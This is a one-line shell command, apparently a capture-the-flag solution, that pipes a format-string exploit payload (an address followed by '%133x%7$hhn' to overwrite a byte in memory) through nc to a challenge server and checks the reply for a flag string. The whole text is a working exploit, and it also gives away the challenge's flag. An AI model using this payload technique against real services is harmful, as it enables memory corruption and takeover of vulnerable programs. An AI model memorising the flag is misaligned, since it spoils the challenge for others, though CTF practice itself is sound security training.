(python2.7 -c 'print "\x10\xa0\x04\x08%133x%7$hhn"') | nc webctf.it 6000 | grep -q 'flag{WeSurvivedCoronaVirus(Maybe?)}'
